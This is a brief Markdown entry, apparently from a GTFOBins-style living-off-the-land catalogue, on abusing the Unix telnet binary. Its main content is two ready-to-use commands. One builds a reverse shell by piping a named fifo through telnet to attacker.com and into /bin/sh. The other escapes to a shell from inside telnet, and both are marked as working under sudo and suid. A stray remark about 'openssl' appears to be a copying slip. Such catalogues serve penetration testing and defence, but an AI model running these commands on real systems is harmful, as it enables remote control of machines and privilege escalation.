---
type: gtfobin
name: telnet
platform: Unix
functions: [reverse-shell, shell]
tags: [gtfobin, unix, lotl]
---

# telnet

## reverse-shell

```bash
mkfifo /path/to/temp-socket
telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
```
_The shell process is not spawn by `openssl`._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
telnet
!/bin/sh
```
**Contexts:** sudo, suid, unprivileged
